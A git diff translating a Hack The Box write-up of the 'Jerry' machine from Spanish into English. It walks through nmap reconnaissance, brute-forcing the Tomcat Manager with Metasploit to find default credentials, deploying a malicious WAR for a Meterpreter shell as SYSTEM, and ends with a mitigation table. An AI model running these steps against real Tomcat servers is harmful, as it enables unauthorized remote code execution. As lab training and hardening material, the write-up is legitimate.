@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: Jerry"
 date: 2026-06-13
 draft: false
-description: "Walkthrough completo de la máquina Jerry de Hack The Box. Dificultad Easy, OS Windows Server 2012 R2. Credenciales por defecto en Apache Tomcat Manager, despliegue de WAR malicioso y shell directa como SYSTEM."
+description: "Full walkthrough of the Jerry machine from Hack The Box. Easy difficulty, Windows Server 2012 R2. Default credentials on Apache Tomcat Manager, malicious WAR deployment, and direct shell as SYSTEM."
 tags: ["HackTheBox", "Windows", "Easy", "Tomcat", "WAR", "DefaultCredentials", "RCE", "Metasploit", "jerry", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Jerry** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows Server 2012 R2**. Apache Tomcat 7.0.88 expuesto con credenciales por defecto en el Manager. Las usamos para desplegar un WAR malicioso que nos entrega ejecución de código remota directamente como **NT AUTHORITY\SYSTEM** — sin escalada de privilegios necesaria.
+Walkthrough of **Jerry** on Hack The Box. **Easy** difficulty machine running **Windows Server 2012 R2**. Apache Tomcat 7.0.88 exposed with default credentials in the Manager. We use them to deploy a malicious WAR that delivers remote code execution directly as **NT AUTHORITY\SYSTEM** — no privilege escalation needed.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **Jerry** en Hack The Box. Máquina de dificultad **Easy** con si
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                        |
-|----------------|----------------------------------------------------------------|
-| **Nombre**     | Jerry                                                          |
-| **OS**         | Windows Server 2012 R2                                         |
-| **Dificultad** | Easy                                                           |
-| **IP**         | 10.129.136.9                                                   |
-| **Técnicas**   | Default Credentials · Tomcat WAR Deploy · RCE como SYSTEM      |
+| Field          | Detail                                                        |
+|----------------|---------------------------------------------------------------|
+| **Name**       | Jerry                                                         |
+| **OS**         | Windows Server 2012 R2                                        |
+| **Difficulty** | Easy                                                          |
+| **IP**         | 10.129.136.9                                                  |
+| **Techniques** | Default Credentials · Tomcat WAR Deploy · RCE as SYSTEM       |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.136.9
@@ -43,7 +43,7 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
-Escaneo de versiones:
+Version scan:
 
 ```bash
 nmap -sC -sV -p8080 10.129.136.9
@@ -55,14 +55,14 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache Tomcat/7.0.88
 ```
 
-*Puertos abiertos:*
+*Open ports:*
 - `8080` → **Apache Tomcat 7.0.88**
 
-> **💡 Dato clave:** Tomcat expone el **Manager Application** en `/manager/html` — una interfaz web de administración que permite desplegar aplicaciones Java (archivos `.war`) directamente en el servidor. Autenticarse en el Manager equivale a tener RCE.
+> **💡 Key insight:** Tomcat exposes the **Manager Application** at `/manager/html` — a web admin interface that allows deploying Java applications (`.war` files) directly to the server. Authenticating to the Manager equals RCE.
 
-### 1.2 Enumeración del Tomcat Manager
+### 1.2 Tomcat Manager Enumeration
 
-Navegamos a `http://10.129.136.9:8080/manager/html`. El acceso requiere HTTP Basic Auth. Probamos credenciales por defecto con el módulo de Metasploit:
+We navigate to `http://10.129.136.9:8080/manager/html`. Access requires HTTP Basic Auth. We test default credentials using the Metasploit module:
 
 ```bash
 msf6 > use auxiliary/scanner/http/tomcat_mgr_login
@@ -78,27 +78,27 @@ msf6 auxiliary(tomcat_mgr_login) > run
 [+] LOGIN SUCCESSFUL: tomcat:s3cret
 ```
 
-> **🔑 Credenciales encontradas:** `tomcat:s3cret`. Las credenciales por defecto de Tomcat están documentadas públicamente en el propio repositorio del proyecto — es una de las primeras comprobaciones en cualquier instalación de Tomcat expuesta.
+> **🔑 Credentials found:** `tomcat:s3cret`. Tomcat default credentials are publicly documented in the project's own repository — it's one of the first checks on any exposed Tomcat installation.
 
-> **💡 Conclusiones:** Acceso al Manager con credenciales por defecto. Podemos desplegar un WAR malicioso y obtener RCE directamente.
+> **💡 Conclusion:** Manager access with default credentials. We can deploy a malicious WAR and get RCE directly.
 
 ---
 
-## 2. Explotación — Despliegue de WAR Malicioso
+## 2. Exploitation — Malicious WAR Deployment
 
-### 2.1 Análisis de la Vulnerabilidad
+### 2.1 Vulnerability Analysis
 
-Un archivo **WAR (Web Application Archive)** es el formato estándar de empaquetado de aplicaciones Java para Tomcat. El Manager permite subir y desplegar WARs directamente desde la interfaz web. Al desplegar un WAR que contiene un JSP con código de reverse shell, Tomcat lo extrae, lo sirve como una aplicación web y al visitarlo ejecuta el código en el contexto del proceso de Tomcat.
+A **WAR (Web Application Archive)** is the standard Java application packaging format for Tomcat. The Manager allows uploading and deploying WARs directly through the web interface. By deploying a WAR containing a JSP with a reverse shell payload, Tomcat extracts it, serves it as a web application, and visiting the URL executes the code in the context of the Tomcat process.
 
 ```
-Flujo normal:    upload WAR legítimo → Tomcat despliega la aplicación → sirve la app Java
-Flujo malicioso: upload WAR malicioso → Tomcat despliega el JSP de shell
-                 → visitar la URL activa el JSP → ejecución como SYSTEM
+Normal flow:    upload legitimate WAR → Tomcat deploys the app → serves the Java app
+Malicious flow: upload malicious WAR → Tomcat deploys the shell JSP
+                → visiting the URL triggers the JSP → execution as SYSTEM
 ```
 
-El proceso de Tomcat en esta máquina corre como la cuenta de máquina `JERRY$`, que tiene privilegios equivalentes a administrador local — acceso SYSTEM directo sin escalada.
+The Tomcat process on this machine runs as the machine account `JERRY$`, which has privileges equivalent to local administrator — direct SYSTEM access with no escalation needed.
 
-### 2.2 Ejecución
+### 2.2 Execution
 
 ```bash
 msf6 > use exploit/multi/http/tomcat_mgr_deploy
@@ -112,9 +112,9 @@ msf6 exploit(tomcat_mgr_deploy) > set target 1
 msf6 exploit(tomcat_mgr_deploy) > run
 ```
 
-Dos opciones de configuración relevantes:
-- **`PATH /manager/text`** — La ruta `/manager/text` es la API en texto plano que Metasploit usa para hacer el deploy programáticamente, sin procesar HTML.
-- **`target 1` (Java Universal)** — Genera un payload Java puro (`.class`) que corre sobre la JVM de Tomcat, compatible con Windows y Linux sin depender de la arquitectura del SO.
+Two relevant configuration options:
+- **`PATH /manager/text`** — The `/manager/text` path is the plain-text API that Metasploit uses for programmatic deployment, without parsing HTML.
+- **`target 1` (Java Universal)** — Generates a pure Java payload (`.class`) that runs on Tomcat's JVM, compatible with both Windows and Linux regardless of OS architecture.
 
 ```
 [*] Uploading 6217 bytes as GiLuDM0r7bdIcsQyV.war ...
@@ -128,13 +128,13 @@ meterpreter > getuid
 Server username: JERRY$
 ```
 
-✅ **Shell obtenida directamente como SYSTEM.** No se requiere escalada de privilegios.
+✅ **Shell obtained directly as SYSTEM.** No privilege escalation required.
 
 ---
 
-## 3. Flags — Las Dos por el Precio de Una
+## 3. Flags — Two for the Price of One
 
-Jerry tiene una particularidad: ambas flags están en un único archivo en el escritorio del Administrador, como guiño del creador al hecho de que se obtiene SYSTEM directamente sin pasar por un usuario sin privilegios.
+Jerry has a distinctive quirk: both flags are in a single file on the Administrator's desktop, as a wink from the creator to the fact that SYSTEM is obtained directly without going through an unprivileged user.
 
 ```bash
 meterpreter > cat "C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt"
@@ -147,37 +147,37 @@ root.txt
 [flag]
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 4. Resumen y Lecciones Aprendidas
+## 4. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → Puerto 8080 con Apache Tomcat 7.0.88; Manager Application en `/manager/html`.
-2. **Credenciales por defecto** → `tomcat_mgr_login` → `tomcat:s3cret`.
-3. **WAR malicioso** → `tomcat_mgr_deploy` con Java Universal → JSP ejecutado por Tomcat → shell como `JERRY$` (SYSTEM).
-4. **Flags** → Ambas en un único archivo en el escritorio del Administrador.
+1. **Recon** → Port 8080 with Apache Tomcat 7.0.88; Manager Application at `/manager/html`.
+2. **Default credentials** → `tomcat_mgr_login` → `tomcat:s3cret`.
+3. **Malicious WAR** → `tomcat_mgr_deploy` with Java Universal → JSP executed by Tomcat → shell as `JERRY$` (SYSTEM).
+4. **Flags** → Both in a single file on the Administrator's desktop.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **El Manager de Tomcat con credenciales por defecto es RCE.** No hace falta explotar ninguna vulnerabilidad del software — la funcionalidad legítima de despliegue de WARs es el vector. La seguridad de una instalación de Tomcat depende completamente de proteger el Manager con credenciales fuertes y restricción de acceso por IP.
+- **Tomcat Manager with default credentials is RCE.** No software vulnerability needed — the legitimate WAR deployment functionality is the attack vector. The security of a Tomcat installation depends entirely on protecting the Manager with strong credentials and IP-based access restrictions.
 
-- **Los payloads Java Universal son independientes de la arquitectura del SO.** A diferencia de los payloads nativos (`.exe` para Windows, ELF para Linux), un payload Java corre sobre la JVM sin importar si el sistema es x86, x64, Windows o Linux. En servidores de aplicaciones Java esto es especialmente útil porque la JVM siempre está disponible.
+- **Java Universal payloads are OS-architecture agnostic.** Unlike native payloads (`.exe` for Windows, ELF for Linux), a Java payload runs on the JVM regardless of whether the system is x86, x64, Windows, or Linux. On Java application servers this is especially useful because the JVM is always available.
 
-- **La cuenta de máquina en Windows tiene privilegios de administrador local.** `JERRY$` es la cuenta de máquina del sistema — no es un usuario administrador en el sentido tradicional, pero tiene acceso equivalente a SYSTEM sobre el sistema local. Cuando un servicio corre con esta cuenta, comprometer ese servicio da acceso total sin escalada adicional.
+- **The machine account in Windows has local administrator privileges.** `JERRY$` is the system's machine account — not a traditional admin user, but with equivalent access to SYSTEM on the local system. When a service runs under this account, compromising that service grants full access without additional escalation.
 
-- **Cambiar las credenciales por defecto es el paso de hardening más básico y más frecuentemente omitido.** La contraseña `s3cret` ni siquiera es la contraseña por defecto de Tomcat — alguien la configuró conscientemente. Aun así, está en todas las listas de wordlists de Tomcat. Una contraseña débil y documentada en el Manager es funcionalmente equivalente a no tener contraseña.
+- **Changing default credentials is the most basic and most frequently skipped hardening step.** The password `s3cret` isn't even Tomcat's actual default password — someone configured it deliberately. Yet it appears in every Tomcat wordlist. A weak, documented password on the Manager is functionally equivalent to having no password.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| Credenciales por defecto en Tomcat Manager | Cambiar credenciales inmediatamente tras la instalación; usar contraseñas complejas y únicas |
-| Tomcat Manager accesible desde internet | Restringir `/manager` por IP; deshabilitar el Manager en producción si no es necesario |
-| Tomcat ejecutando como cuenta de máquina (SYSTEM) | Crear un usuario de servicio dedicado sin privilegios administrativos para ejecutar Tomcat |
-| Despliegue de WARs sin restricciones | Deshabilitar el Manager si no se usa activamente; whitelist de WARs autorizados |
-| Tomcat 7.0.88 sin soporte | Actualizar a Tomcat 9.x o 10.x con parches de seguridad activos |
+| Default credentials in Tomcat Manager | Change credentials immediately after installation; use complex, unique passwords |
+| Tomcat Manager accessible from the internet | Restrict `/manager` by IP; disable Manager in production if not needed |
+| Tomcat running as machine account (SYSTEM) | Create a dedicated service user without administrative privileges to run Tomcat |
+| Unrestricted WAR deployment | Disable Manager if not actively used; whitelist of authorized WARs |
+| Tomcat 7.0.88 (end of life) | Upgrade to Tomcat 9.x or 10.x with active security patches |
